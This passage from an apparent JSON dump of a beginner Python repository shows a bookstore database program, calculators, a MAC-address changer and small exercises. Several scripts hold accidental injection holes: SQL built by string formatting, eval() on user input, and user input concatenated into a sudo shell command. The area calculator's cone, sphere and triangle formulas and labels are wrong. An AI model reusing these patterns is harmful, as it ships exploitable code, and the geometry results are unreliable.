BOUGHT\")\n\n                                        separator()\n\n                                        print(\"THANKS FOR COMING\")\n\n                                        separator()\n\n                                        display = \"select * from books\"\n                                        mycur.execute(display)\n                                        data2 = mycur.fetchall()\n\n                                        for y in data2:\n\n                                            if y[1] == book_name:\n\n                                                if y[6] <= 8:\n\n                                                    print(\n                                                        \"WARNING!!!!!!!!!!!!!!!!!!!!!!!\"\n                                                    )\n                                                    print(\n                                                        \"NO.  OF THIS BOOK IS LOW\",\n                                                        \"\\tONLY\",\n                                                        y[6],\n                                                        \"LEFT\",\n                                                    )\n\n                                                    end_separator()\n\n                                                    break\n\n                                        separator()\n\n                                        rep = input(\n                                            \"Do  You  Want  To  Restart  ??    yes / no  --  \"\n                                        ).lower()\n\n                                        if rep == \"yes\":\n\n                                            end_separator()\n\n                                            separator()\n\n                                            DBZ()\n\n                                            continue\n\n                                        else:\n\n                                            end_separator()\n\n                                            DBZ()\n\n                                            os._exit(0)\n\n                                    elif choice44 == \"n\" or choice44 == \"N\":\n\n                                        print(\n                                            \"SORRY  FOR  INCONVENIENCE  WE  WILL  TRY  TO  FULLFILL  YOUR  REQUIREMENT  AS  SOON  AS  POSSIBLE\"\n                                        )\n\n                                        end_separator()\n\n                                        separator()\n\n                                        rep = input(\n                                            \"Do  You  Want  To  Restart  ??    yes / no  --  \"\n                                        ).lower()\n\n                                        if rep == \"yes\":\n\n                                            separator()\n\n                                            DBZ()\n\n                                            continue\n\n                                        else:\n\n                                            end_separator()\n\n                                            DBZ()\n\n                                            os._exit(0)\n\n                                elif y[6] == 0:\n\n                                    print(\n                                        \"SORRY  NO  BOOK  LEFT  WE  WILL  TRY  TO  FULLFILL  YOUR  REQUIREMENT  AS  SOON  AS  POSSIBLE\"\n                                    )\n\n                                    end_separator()\n\n                                    separator()\n\n                                    rep = input(\n                                        \"Do  You  Want  To  Restart  ??    yes / no  --  \"\n                                    ).lower()\n\n                                    if rep == \"yes\":\n\n                                        separator()\n\n                                        DBZ()\n\n                                        continue\n\n                                    else:\n\n                                        end_separator()\n\n                                        DBZ()\n\n                                        os._exit(0)\n\n                            else:\n\n                                u2 = (\n                                    \"update books set numbers_of_book=numbers_of_book -%s where name='%s'\"\n                                    % (wb, book_name)\n                                )\n                                mycur.execute(u2)\n                                mycon.commit()\n\n                                print(\"BOOK WAS BOUGHT\")\n\n                                separator()\n\n                                print(\"THANKS FOR COMING\")\n\n                                display = \"select * from books\"\n                                mycur.execute(display)\n                                data2 = mycur.fetchall()\n\n                                for y in data2:\n\n                                    if y[1] == book_name:\n\n                                        CNB2()\n\n                                        separator()\n\n                                        rep = input(\n                                            \"Do  You  Want  To  Restart  ??    yes / no  --  \"\n                                        ).lower()\n\n                                        if rep == \"yes\":\n\n                                            separator()\n\n                                            DBZ()\n\n                                            continue\n\n                                        else:\n\n                                            end_separator()\n\n                                            DBZ()\n\n                                            os._exit(0)\n\n            else:\n\n                separator()\n\n                print(\"NO BOOK IS BOUGHT\")\n\n                end_separator()\n\n                separator()\n\n                rep = input(\"Do  You  Want  To  Restart  ??    yes / no  --  \").lower()\n\n                if rep == \"yes\":\n\n                    separator()\n\n                    DBZ()\n\n                    continue\n\n                else:\n\n                    end_separator()\n\n                    DBZ()\n\n                    os._exit(0)\n\n        else:\n\n            separator()\n\n            print(\"SORRY NO BOOK WITH THIS NAME EXIST / NAME IS INCORRECT\")\n\n            end_separator()\n\n            separator()\n\n            rep = input(\"Do  You  Want  To  Restart  ??    yes / no  --  \").lower()\n\n            if rep == \"yes\":\n\n                separator()\n\n                DBZ()\n\n                continue\n\n            else:\n\n                end_separator()\n\n                DBZ()\n\n                os._exit(0)\n\n    # ADDING BOOK\n\n    if choice == 3:\n\n        q10 = int(input(\"ENTER NO. OF BOOKS TO ADD -- \"))\n\n        separator()\n\n        for k in range(q10):\n\n            SNo10 = int(input(\"ENTER SNo OF BOOK -- \"))\n            name10 = input(\"ENTER NAME OF BOOK --- \")\n            author10 = input(\"ENTER NAME OF AUTHOR -- \")\n            year10 = int(input(\"ENTER YEAR OF PUBLISHING -- \"))\n            ISBN10 = input(\"ENTER ISBN OF BOOK -- \")\n            price10 = int(input(\"ENTER PRICE OF BOOK -- \"))\n            nob10 = int(input(\"ENTER NO. OF BOOKS -- \"))\n\n            display10 = \"select * from books where ISBN='%s'\" % (ISBN10)\n            mycur.execute(display10)\n            data20 = mycur.fetchone()\n\n            if data20 != None:\n\n                print(\"This  ISBN Already Exists\")\n\n                os._exit(0)\n\n            else:\n\n                insert = (SNo10, name10, author10, year10, ISBN10, price10, nob10)\n                insert20 = \"insert into books values(%s,%s,%s,%s,%s,%s,%s)\"\n                mycur.execute(insert20, insert)\n                mycon.commit()\n\n                separator()\n\n                print(\"BOOK IS ADDED\")\n\n                separator()\n\n        rep = input(\"Do  You  Want  To  Restart  ??    yes / no  --  \").lower()\n\n        if rep == \"yes\":\n\n            separator()\n\n            DBZ()\n\n            continue\n\n        else:\n\n            end_separator()\n\n            DBZ()\n\n            os._exit(0)\n\n    # UPDATING BOOK\n\n    if choice == 4:\n\n        choice4 = input(\"ENTER ISBN OF BOOK -- \")\n\n        separator()\n\n        display = \"select * from books where ISBN='%s'\" % (choice4)\n        mycur.execute(display)\n        data2 = mycur.fetchone()\n\n        if data2 != None:\n\n            SNo1 = int(input(\"ENTER NEW SNo OF BOOK -- \"))\n            name1 = input(\"ENTER NEW NAME OF BOOK --- \")\n            author1 = input(\"ENTER NEW NAME OF AUTHOR -- \")\n            year1 = int(input(\"ENTER NEW YEAR OF PUBLISHING -- \"))\n            ISBN1 = input(\"ENTER NEW ISBN OF BOOK -- \")\n            price1 = int(input(\"ENTER NEW PRICE OF BOOK -- \"))\n            nob = int(input(\"ENTER NEW NO. OF BOOKS -- \"))\n            insert = (SNo1, name1, author1, year1, ISBN1, price1, nob, choice4)\n            update = \"update books set SNo=%s,Name=%s,Author=%s,Year=%s,ISBN=%s,Price=%s,numbers_of_book=%s where ISBN=%s\"\n            mycur.execute(update, insert)\n            mycon.commit()\n\n            separator()\n\n            print(\"BOOK IS UPDATED\")\n\n            separator()\n\n            rep = input(\"Do  You  Want  To  Restart  ??    yes / no  --  \").lower()\n\n            if rep == \"yes\":\n\n                separator()\n\n                DBZ()\n\n                continue\n\n            else:\n\n                end_separator()\n\n                DBZ()\n\n                os._exit(0)\n\n        else:\n\n            print(\"SORRY NO BOOK WITH THIS ISBN IS EXIST  /  INCORRECT ISBN\")\n\n            print()\n            print()\n\n            separator()\n\n            rep = input(\"Do  You  Want  To  Restart  ??    yes / no  --  \").lower()\n\n            if rep == \"yes\":\n\n                separator()\n\n                DBZ()\n\n                continue\n\n            else:\n\n                end_separator()\n\n                DBZ()\n\n                os._exit(0)\n\n    # DELETING A BOOK\n\n    if choice == 5:\n\n        ISBN1 = input(\"ENTER ISBN OF THAT BOOK THAT YOU WANT TO DELETE -- \")\n        display = \"select * from books where ISBN='%s'\" % (ISBN1)\n        mycur.execute(display)\n        data2 = mycur.fetchone()\n\n        if data2 != None:\n\n            separator()\n\n            choice5 = input(\"ARE YOU SURE TO DELETE THIS BOOK ENTER Y/N -- \")\n\n            if choice5 == \"Y\" or choice5 == \"y\":\n\n                separator()\n\n                ISBN2 = input(\"PLEASE ENTER ISBN AGAIN -- \")\n                delete = \"delete from books where ISBN='%s'\" % (ISBN2)\n                mycur.execute(delete)\n                mycon.commit()\n\n                separator()\n\n                print(\"BOOK IS DELETED\")\n\n                print()\n                print()\n\n                separator()\n\n                rep = input(\"Do  You  Want  To  Restart  ??    yes / no  --  \").lower()\n\n                if rep == \"yes\":\n\n                    separator()\n\n                    DBZ()\n\n                    continue\n\n                else:\n\n                    end_separator()\n\n                    DBZ()\n\n                    os._exit(0)\n\n            else:\n\n                separator()\n\n                print(\"NO BOOK IS DELETED\")\n\n                print()\n                print()\n\n                separator()\n\n                rep = input(\"Do  You  Want  To  Restart  ??    yes / no  --  \").lower()\n\n                if rep == \"yes\":\n\n                    separator()\n\n                    DBZ()\n\n                    continue\n\n                else:\n\n                    end_separator()\n\n                    DBZ()\n\n                    os._exit(0)\n\n        else:\n\n            separator()\n\n            print(\"SORRY NO BOOK WITH THIS ISBN AVAILABLE / ISBN IS INCORRECT\")\n\n            print()\n            print()\n\n            separator()\n\n            rep = input(\"Do  You  Want  To  Restart  ??    yes / no  --  \").lower()\n\n            if rep == \"yes\":\n\n                separator()\n\n                DBZ()\n\n                continue\n\n            else:\n\n                end_separator()\n\n                DBZ()\n\n                os._exit(0)\n\n    # CLOSE\n\n    if choice == 6:\n\n        exit()\n        os._exit(0)\n\n\n# IF  NO.  OF  BOOKS  IS     ZERO(  0  )     THAN  DELETE  IT  AUTOMATICALLY\n\n\ndisplay = \"select * from books\"\nmycur.execute(display)\ndata2 = mycur.fetchall()\n\n\nfor y in data2:\n\n    if y[6] <= 0:\n\n        delete = \"delete from books where  Numbers_of_book<=0\"\n        mycur.execute(delete)\n        mycon.commit()\n"
        },
        {
          "name": "brickout-game",
          "type": "tree",
          "content": null
        },
        {
          "name": "calc_area.py",
          "type": "blob",
          "size": 1.5947265625,
          "content": "# Author: PrajaktaSathe\n# Program to calculate the area of - square, rectangle, circle, and triangle -\nimport math as m\n\n\ndef main():\n    shape = int(\n        input(\n            \"Enter 1 for square, 2 for rectangle, 3 for circle, 4 for triangle, 5 for cylinder, 6 for cone, or 7 for sphere: \"\n        )\n    )\n    if shape == 1:\n        side = float(input(\"Enter length of side: \"))\n        print(\"Area of square = \" + str(side ** 2))\n    elif shape == 2:\n        l = float(input(\"Enter length: \"))\n        b = float(input(\"Enter breadth: \"))\n        print(\"Area of rectangle = \" + str(l * b))\n    elif shape == 3:\n        r = float(input(\"Enter radius: \"))\n        print(\"Area of circle = \" + str(m.pi * r * r))\n    elif shape == 4:\n        base = float(input(\"Enter base: \"))\n        h = float(input(\"Enter height: \"))\n        print(\"Area of rectangle = \" + str(0.5 * base * h))\n    elif shape == 5:\n        r = float(input(\"Enter radius: \"))\n        h = float(input(\"Enter height: \"))\n        print(\"Area of cylinder = \" + str(m.pow(r, 2) * h * m.pi))\n    elif shape == 6:\n        r = float(input(\"Enter radius: \"))\n        h = float(input(\"Enter height: \"))\n        print(\"Area of cone = \" + str(m.pow(r, 2) * h * 1 / 3 * m.pi))\n    elif shape == 7:\n        r = float(input(\"Enter radius: \"))\n        print(\"Area of sphere = \" + str(m.pow(r, 3) * 4 / 3 * m.pi))\n    else:\n        print(\"You have selected wrong choice.\")\n\n    restart = input(\"Would you like to calculate the area of another object? Y/N : \")\n\n    if restart.lower().startswith(\"y\"):\n        main()\n    elif restart.lower().startswith(\"n\"):\n        quit()\n\n\nmain()\n"
        },
        {
          "name": "calculator-gui.py",
          "type": "blob",
          "size": 11.99609375,
          "content": "# ==================== Libraries ====================\r\nimport tkinter as tk\r\nfrom tkinter import ttk\r\nfrom tkinter import messagebox\r\n\r\n# ===================================================\r\n# ==================== Classes ======================\r\n\r\n\r\nclass Inside:\r\n    def __init__(self, parent):\r\n        self.parent = parent\r\n        # ----- Main Frame -----\r\n        self.cal_frame = ttk.Frame(self.parent)\r\n        self.cal_frame.grid(row=0, column=0)\r\n        # ----------------------\r\n        # ----- Variable For Main Output -----\r\n        self.out_var = tk.StringVar()\r\n        # ----- Operator Chooser -----\r\n        self.opr = tk.StringVar()\r\n        # ----- Values Holder -----\r\n        self.value1 = tk.StringVar()\r\n        self.value2 = tk.StringVar()\r\n        # ------------------------------------\r\n        self.output_box()  # <---------- Output Box Shower\r\n        self.cal_buttons()  # <---------- Buttons On Calculator\r\n\r\n    def output_box(self):\r\n        show = ttk.Entry(\r\n            self.cal_frame,\r\n            textvariable=self.out_var,\r\n            width=25,\r\n            font=(\"calibri\", 16),\r\n            state=\"readonly\",\r\n        )\r\n        show.grid(row=0, column=0, sticky=tk.W, ipady=6, ipadx=1, columnspan=4)\r\n        show.focus()\r\n\r\n    # ========== * Button Events * ========== < --- Sequence 789456123\r\n    def press_7(self):\r\n        current = self.out_var.get()\r\n        if current == \"\":\r\n            self.out_var.set(7)\r\n        else:\r\n            current += str(7)\r\n            self.out_var.set(current)\r\n\r\n    def press_8(self):\r\n        current = self.out_var.get()\r\n        if current == \"\":\r\n            self.out_var.set(8)\r\n        else:\r\n            current += str(8)\r\n            self.out_var.set(current)\r\n\r\n    def press_9(self):\r\n        current = self.out_var.get()\r\n        if current == \"\":\r\n            self.out_var.set(9)\r\n        else:\r\n            current += str(9)\r\n            self.out_var.set(current)\r\n\r\n    def press_4(self):\r\n        current = self.out_var.get()\r\n        if current == \"\":\r\n            self.out_var.set(4)\r\n        else:\r\n            current += str(4)\r\n            self.out_var.set(current)\r\n\r\n    def press_5(self):\r\n        current = self.out_var.get()\r\n        if current == \"\":\r\n            self.out_var.set(5)\r\n        else:\r\n            current += str(5)\r\n            self.out_var.set(current)\r\n\r\n    def press_6(self):\r\n        current = self.out_var.get()\r\n        if current == \"\":\r\n            self.out_var.set(6)\r\n        else:\r\n            current += str(6)\r\n            self.out_var.set(current)\r\n\r\n    def press_1(self):\r\n        current = self.out_var.get()\r\n        if current == \"\":\r\n            self.out_var.set(1)\r\n        else:\r\n            current += str(1)\r\n            self.out_var.set(current)\r\n\r\n    def press_2(self):\r\n        current = self.out_var.get()\r\n        if current == \"\":\r\n            self.out_var.set(2)\r\n        else:\r\n            current += str(2)\r\n            self.out_var.set(current)\r\n\r\n    def press_3(self):\r\n        current = self.out_var.get()\r\n        if current == \"\":\r\n            self.out_var.set(3)\r\n        else:\r\n            current += str(3)\r\n            self.out_var.set(current)\r\n\r\n    def press_0(self):\r\n        current = self.out_var.get()\r\n        if current == \"\":\r\n            self.out_var.set(0)\r\n        else:\r\n            current += str(0)\r\n            self.out_var.set(current)\r\n\r\n    # ========== Operators Button Handling Function ==========\r\n    def press_clear(self):\r\n        self.out_var.set(\"\")\r\n\r\n    def press_reset(self):\r\n        self.out_var.set(\"\")\r\n\r\n    def press_plus(self):\r\n        self.value1 = self.out_var.get()\r\n        if self.value1 == \"\":\r\n            messagebox.showwarning(\r\n                \"Operator Before Number\", \"Please Enter Number Before Operator\"\r\n            )\r\n        else:\r\n            self.out_var.set(\"\")\r\n            self.opr = \"+\"\r\n\r\n    def press_min(self):\r\n        self.value1 = self.out_var.get()\r\n        if self.value1 == \"\":\r\n            messagebox.showwarning(\r\n                \"Operator Before Number\", \"Please Enter Number Before Operator\"\r\n            )\r\n        else:\r\n            self.out_var.set(\"\")\r\n            self.opr = \"-\"\r\n\r\n    def press_mul(self):\r\n        self.value1 = self.out_var.get()\r\n        if self.value1 == \"\":\r\n            messagebox.showwarning(\r\n                \"Operator Before Number\", \"Please Enter Number Before Operator\"\r\n            )\r\n        else:\r\n            self.out_var.set(\"\")\r\n            self.opr = \"*\"\r\n\r\n    def press_div(self):\r\n        self.value1 = self.out_var.get()\r\n        if self.value1 == \"\":\r\n            messagebox.showwarning(\r\n                \"Operator Before Number\", \"Please Enter Number Before Operator\"\r\n            )\r\n        else:\r\n            self.out_var.set(\"\")\r\n            self.opr = \"/\"\r\n\r\n    # ==============================================\r\n    # ========== ***** Equal Button Function ***** ==========\r\n    def press_equal(self):\r\n        self.value2 = self.out_var.get()\r\n        if self.value2 == \"\":\r\n            messagebox.showerror(\r\n                \"Second Number\", \"Please Enter Second Number To Perform Calculation\"\r\n            )\r\n        else:\r\n\r\n            try:\r\n                if self.opr == \"+\":\r\n                    self.value1 = int(self.value1)\r\n                    self.value2 = int(self.value2)\r\n                    result = self.value1 + self.value2\r\n                    self.out_var.set(result)\r\n                if self.opr == \"-\":\r\n                    self.value1 = int(self.value1)\r\n                    self.value2 = int(self.value2)\r\n                    result = self.value1 - self.value2\r\n                    self.out_var.set(result)\r\n                if self.opr == \"*\":\r\n                    self.value1 = int(self.value1)\r\n                    self.value2 = int(self.value2)\r\n                    result = self.value1 * self.value2\r\n                    self.out_var.set(result)\r\n                if self.opr == \"/\":\r\n                    self.value1 = int(self.value1)\r\n                    self.value2 = int(self.value2)\r\n                    result = self.value1 / self.value2\r\n                    self.out_var.set(result)\r\n\r\n            except ValueError:\r\n                messagebox.showinfo(\r\n                    \"Restart\", \"Please Close And Restart Application...Sorry\"\r\n                )\r\n\r\n    def cal_buttons(self):\r\n        # ===== Row 1 =====\r\n        btn_c = tk.Button(\r\n            self.cal_frame,\r\n            text=\"Clear\",\r\n            width=6,\r\n            height=2,\r\n            bd=2,\r\n            bg=\"#58a8e0\",\r\n            command=self.press_clear,\r\n        )\r\n        btn_c.grid(row=1, column=0, sticky=tk.W, pady=5)\r\n        btn_div = tk.Button(\r\n            self.cal_frame,\r\n            text=\"/\",\r\n            width=6,\r\n            height=2,\r\n            bd=2,\r\n            bg=\"#58a8e0\",\r\n            command=self.press_div,\r\n        )\r\n        btn_div.grid(row=1, column=1, sticky=tk.W)\r\n        btn_mul = tk.Button(\r\n            self.cal_frame,\r\n            text=\"*\",\r\n            width=6,\r\n            height=2,\r\n            bd=2,\r\n            bg=\"#58a8e0\",\r\n            command=self.press_mul,\r\n        )\r\n        btn_mul.grid(row=1, column=2, sticky=tk.E)\r\n        btn_min = tk.Button(\r\n            self.cal_frame,\r\n            text=\"-\",\r\n            width=6,\r\n            height=2,\r\n            bd=2,\r\n            bg=\"#58a8e0\",\r\n            command=self.press_min,\r\n        )\r\n        btn_min.grid(row=1, column=3, sticky=tk.E)\r\n        # ===== Row 2 =====\r\n        btn_7 = tk.Button(\r\n            self.cal_frame,\r\n            text=\"7\",\r\n            width=6,\r\n            height=2,\r\n            bd=2,\r\n            bg=\"#90a9b8\",\r\n            command=self.press_7,\r\n        )\r\n        btn_7.grid(row=2, column=0, sticky=tk.W, pady=2)\r\n        btn_8 = tk.Button(\r\n            self.cal_frame,\r\n            text=\"8\",\r\n            width=6,\r\n            height=2,\r\n            bd=2,\r\n            bg=\"#90a9b8\",\r\n            command=self.press_8,\r\n        )\r\n        btn_8.grid(row=2, column=1, sticky=tk.W)\r\n        btn_9 = tk.Button(\r\n            self.cal_frame,\r\n            text=\"9\",\r\n            width=6,\r\n            height=2,\r\n            bd=2,\r\n            bg=\"#90a9b8\",\r\n            command=self.press_9,\r\n        )\r\n        btn_9.grid(row=2, column=2, sticky=tk.E)\r\n        btn_plus = tk.Button(\r\n            self.cal_frame,\r\n            text=\"+\",\r\n            width=6,\r\n            height=5,\r\n            bd=2,\r\n            bg=\"#58a8e0\",\r\n            command=self.press_plus,\r\n        )\r\n        btn_plus.grid(row=2, column=3, sticky=tk.E, rowspan=2)\r\n        # ===== Row 3 =====\r\n        btn_4 = tk.Button(\r\n            self.cal_frame,\r\n            text=\"4\",\r\n            width=6,\r\n            height=2,\r\n            bd=2,\r\n            bg=\"#90a9b8\",\r\n            command=self.press_4,\r\n        )\r\n        btn_4.grid(row=3, column=0, sticky=tk.W, pady=2)\r\n        btn_5 = tk.Button(\r\n            self.cal_frame,\r\n            text=\"5\",\r\n            width=6,\r\n            height=2,\r\n            bd=2,\r\n            bg=\"#90a9b8\",\r\n            command=self.press_5,\r\n        )\r\n        btn_5.grid(row=3, column=1, sticky=tk.W)\r\n        btn_6 = tk.Button(\r\n            self.cal_frame,\r\n            text=\"6\",\r\n            width=6,\r\n            height=2,\r\n            bd=2,\r\n            bg=\"#90a9b8\",\r\n            command=self.press_6,\r\n        )\r\n        btn_6.grid(row=3, column=2, sticky=tk.E)\r\n        # ===== Row 4 =====\r\n        btn_1 = tk.Button(\r\n            self.cal_frame,\r\n            text=\"1\",\r\n            width=6,\r\n            height=2,\r\n            bd=2,\r\n            bg=\"#90a9b8\",\r\n            command=self.press_1,\r\n        )\r\n        btn_1.grid(row=4, column=0, sticky=tk.W, pady=2)\r\n        btn_2 = tk.Button(\r\n            self.cal_frame,\r\n            text=\"2\",\r\n            width=6,\r\n            height=2,\r\n            bd=2,\r\n            bg=\"#90a9b8\",\r\n            command=self.press_2,\r\n        )\r\n        btn_2.grid(row=4, column=1, sticky=tk.W)\r\n        btn_3 = tk.Button(\r\n            self.cal_frame,\r\n            text=\"3\",\r\n            width=6,\r\n            height=2,\r\n            bd=2,\r\n            bg=\"#90a9b8\",\r\n            command=self.press_3,\r\n        )\r\n        btn_3.grid(row=4, column=2, sticky=tk.E)\r\n        btn_equal = tk.Button(\r\n            self.cal_frame,\r\n            text=\"=\",\r\n            width=6,\r\n            height=5,\r\n            bd=2,\r\n            bg=\"orange\",\r\n            command=self.press_equal,\r\n        )\r\n        btn_equal.grid(row=4, column=3, sticky=tk.E, rowspan=2)\r\n        # ===== Row 5 =====\r\n        btn_0 = tk.Button(\r\n            self.cal_frame,\r\n            text=\"0\",\r\n            width=14,\r\n            height=2,\r\n            bd=2,\r\n            bg=\"#90a9b8\",\r\n            command=self.press_0,\r\n        )\r\n        btn_0.grid(row=5, column=0, sticky=tk.W, pady=2, columnspan=2)\r\n        btn_reset = tk.Button(\r\n            self.cal_frame,\r\n            text=\"Reset\",\r\n            width=6,\r\n            height=2,\r\n            bd=2,\r\n            bg=\"#90a9b8\",\r\n            command=self.press_reset,\r\n        )\r\n        btn_reset.grid(row=5, column=2, sticky=tk.E)\r\n\r\n\r\nclass Main(tk.Tk):\r\n    def __init__(self, *args, **kwargs):\r\n        super().__init__(*args, **kwargs)\r\n        # ----- Title -----\r\n        self.title(\"Calculator\")\r\n        # -----------------\r\n        # ----- Geometry Settings -----\r\n        self.geometry_settings()\r\n        # -----------------------------\r\n\r\n    def geometry_settings(self):\r\n        _com_width = self.winfo_screenwidth()\r\n        _com_height = self.winfo_screenheight()\r\n        _my_width = 360\r\n        _my_height = 350\r\n        _x = int(_com_width / 2 - _my_width / 2)\r\n        _y = int(_com_height / 2 - _my_height / 2)\r\n        geo_string = (\r\n            str(_my_width) + \"x\" + str(_my_height) + \"+\" + str(_x) + \"+\" + str(_y)\r\n        )\r\n        # ----- Setting Now -----\r\n        self.geometry(geo_string)\r\n        self.resizable(width=False, height=False)\r\n        # -----------------------\r\n\r\n\r\n# =================== Running The Application =======\r\nif __name__ == \"__main__\":\r\n    calculator = Main()\r\n    Inside(calculator)\r\n    calculator.mainloop()\r\n"
        },
        {
          "name": "calculator.py",
          "type": "blob",
          "size": 3.2177734375,
          "content": "\"\"\"\nWritten by  : Shreyas Daniel - github.com/shreydan\nDescription : Uses Pythons eval() function\n              as a way to implement calculator.\n             \nFunctions available are:\n--------------------------------------------\n                         + : addition\n                         - : subtraction\n                         * : multiplication\n                         / : division\n                         % : percentage\n                         e : 2.718281...\n                        pi : 3.141592... \n                      sine : sin(rad)\n                    cosine : cos(rad)\n                   exponent: x^y\n                   tangent : tan(rad)\n                 remainder : XmodY\n               square root : sqrt(n)\n  round to nearest integer : round(n)\nconvert degrees to radians : rad(deg)\nabsolute value             : aval(n)\n\"\"\"\n\nimport sys\n\n## Imported math library to run sin(), cos(), tan() and other such functions in the calculator\n\nfrom fileinfo import raw_input\n\n\ndef calc(term):\n    \"\"\"\n    input: term of type str\n    output: returns the result of the computed term.\n    purpose: This function is the actual calculator and the heart of the application\n    \"\"\"\n\n    # This part is for reading and converting function expressions.\n    term = term.lower()\n\n    # This part is for reading and converting arithmetic terms.\n    term = term.replace(\" \", \"\")\n    term = term.replace(\"^\", \"**\")\n    term = term.replace(\"=\", \"\")\n    term = term.replace(\"?\", \"\")\n    term = term.replace(\"%\", \"/100.00\")\n    term = term.replace(\"rad\", \"radians\")\n    term = term.replace(\"mod\", \"%\")\n    term = term.replace(\"aval\", \"abs\")\n\n    functions = [\n        \"sin\",\n        \"cos\",\n        \"tan\",\n        \"pow\",\n        \"cosh\",\n        \"sinh\",\n        \"tanh\",\n        \"sqrt\",\n        \"pi\",\n        \"radians\",\n        \"e\",\n    ]\n\n    for func in functions:\n        if func in term:\n            withmath = \"math.\" + func\n            term = term.replace(func, withmath)\n\n    try:\n\n        # here goes the actual evaluating.\n        term = eval(term)\n\n    # here goes to the error cases.\n    except ZeroDivisionError:\n\n        print(\"Can't divide by 0.  Please try again.\")\n\n    except NameError:\n\n        print(\"Invalid input.  Please try again\")\n\n    except AttributeError:\n\n        print(\"Please check usage method and try again.\")\n    except TypeError:\n        print(\"please enter inputs of correct datatype \")\n\n    return term\n\n\ndef result(term):\n    \"\"\"\n    input:  term of type str\n    output: none\n    purpose: passes the argument to the function calc(...) and\n            prints the result onto console.\n    \"\"\"\n    print(\"\\n\" + str(calc(term)))\n\n\ndef main():\n    \"\"\"\n    main-program\n    purpose: handles user input and prints\n             information to the console.\n    \"\"\"\n\n    print(\n        \"\\nScientific Calculator\\n\\nFor Example: sin(rad(90)) + 50% * (sqrt(16)) + round(1.42^2)\"\n        + \"- 12mod3\\n\\nEnter quit to exit\"\n    )\n\n    if sys.version_info.major >= 3:\n        while True:\n            k = input(\"\\nWhat is \")\n            if k == \"quit\":\n                break\n            result(k)\n\n    else:\n        while True:\n            k = raw_input(\"\\nWhat is \")\n            if k == \"quit\":\n                break\n            result(k)\n\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "cartesian_product.py",
          "type": "blob",
          "size": 0.48828125,
          "content": "\"\"\"Cartesian Product of Two Lists.\"\"\"\n\n# Import\nfrom itertools import product\n\n\n# Cartesian Product of Two Lists\ndef cartesian_product(list1, list2):\n    \"\"\"Cartesian Product of Two Lists.\"\"\"\n    for _i in list1:\n        for _j in list2:\n            print((_i, _j), end=' ')\n\n\n# Main\nif __name__ == '__main__':\n    list1 = input().split()\n    list2 = input().split()\n\n    # Convert to ints\n    list1 = [int(i) for i in list1]\n    list2 = [int(i) for i in list2]\n\n    cartesian_product(list1, list2)\n\n"
        },
        {
          "name": "changemac.py",
          "type": "blob",
          "size": 2.60546875,
          "content": "# Author- RIZWAN AHMAD\n\n# Simple python Script to change mac address of linux generate random or enter mac address\n\n\nimport random\nfrom subprocess import PIPE, Popen\n\n\n# function for returning terminal command\ndef cret(command):\n    process = Popen(args=command, stdout=PIPE, shell=True)\n    return process.communicate()[0]\n\n\n# function for genrate mac address random\ndef randmac():\n    return [\n        0x00,\n        0x16,\n        0x3E,\n        random.randint(0x00, 0x7F),\n        random.randint(0x00, 0xFF),\n        random.randint(0x00, 0xFF),\n    ]\n\n\ndef retrandmac(mac):\n    return \":\".join(map(lambda x: \"%02x\" % x, mac))\n\n\nprint(\"                                             +-+-+-+ +-+-+-+-+-+-+-+\")\nprint(\"                                             |M|A|C| |c|h|a|n|g|e|r|\")\nprint(\"                                             +-+-+-+ +-+-+-+-+-+-+-+\")\n# finding wireless interface name that should start with wl e.g.-wlan0,wlp3s0\ninfname = cret('ifconfig -a  | egrep \"^[wl-wl]+\" | sed \"s/: .*//\" | grep -v \"lo\"')\n# INTERFACE NAME 6 character so return 6 last character\ninfname = infname[:6]\ninfname = infname.decode(\"utf-8\")\n# GETTING MAC Address from /sys/class/net/wlan0/address directory\ncmdgetmac = \"cat /sys/class/net/\" + infname + \"/address\"\ncrrntmac = cret(\"cat /sys/class/net/\" + infname + \"/address\")\ncrrntmac = crrntmac.decode(\"utf-8\")\nprint(\n    \"Your Current mac address = \"\n    + crrntmac\n    + \"\\nEnter Option to change Your MAC:\\n1. Enter MAC address manually \\n2. Automatic Random MAC address\"\n)\nopt = int(input())\n\nif opt == 1:\n    print(\"Please Enter Your New MAC address: \\nExmple:  46:d2:f4:0c:2a:50\")\n\n    newmac = input()\n    print(\"Please wait changing  mac address..................\")\n\n    # first turn off wifi\n    cret(\"nmcli radio wifi off\")\n\n    changemaccmd = \"sudo ip link set dev \" + infname + \" address \" + newmac\n    # executing command with new mac address\n    cret(changemaccmd)\n    # turning on wifi\n    cret(\"nmcli radio wifi on\")\n    # GETTING MAC Address from /sys/class/net/wlan0/address directory\n    cr = cret(\"cat /sys/class/net/\" + infname + \"/address\")\n    cr = cr.decode(\"utf-8\")\n\n    print(\"\\nNow Your Current mac address = \" + cr)\n\n\nelif opt == 2:\n    genmac = retrandmac(randmac())\n    print(\"Please wait generating new mac address.....................\")\n    cret(\"nmcli radio wifi off\")\n    changemaccmd = \"sudo ip link set dev \" + infname + \" address \" + genmac\n    cret(changemaccmd)\n    cret(\"nmcli radio wifi on\")\n    cr = cret(\"cat /sys/class/net/\" + infname + \"/address\")\n    cr = cr.decode(\"utf-8\")\n    print(\"Now Your Current mac address = \" + cr)\n\nelse:\n    print(\"You Have Selected wrong Option\")\n"
        },
        {
          "name": "chaos.py",
          "type": "blob",
          "size": 0.5224609375,
          "content": "# A simple program illustrating chaotic behaviour\n\n\ndef main():\n    print(\"This program illustrates a chaotic function\")\n\n    while True:\n        try:\n            x = float((input(\"Enter a number between 0 and 1: \")))\n            if 0 < x and x < 1:\n                break\n            else:\n                print(\"Please enter correct number\")\n        except Exception as e:\n            print(\"Please enter correct number\")\n\n    for i in range(10):\n        x = 3.9 * x * (1 - x)\n        print(x)\n\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "check  if a number positive , negative or zero",
          "type": "blob",
          "size": 0.30859375,
          "content": "num = float(input(\"Enter a number: \"))\nif num > 0:\n   print(\"Positive number\")\nelif num == 0:\n   print(\"Zero\")\nelse:\n   print(\"Negative number\")\n   num = float(input(\"Enter a number: \"))\nif num >= 0:\n   if num == 0:\n       print(\"Zero\")\n   else:\n       print(\"Positive number\")\nelse:\n   print(\"Negative number\")\n   \n"
        },
        {
          "name": "check whether the string is Symmetrical or Palindrome.py",
          "type": "blob",
          "size": 1.0322265625,
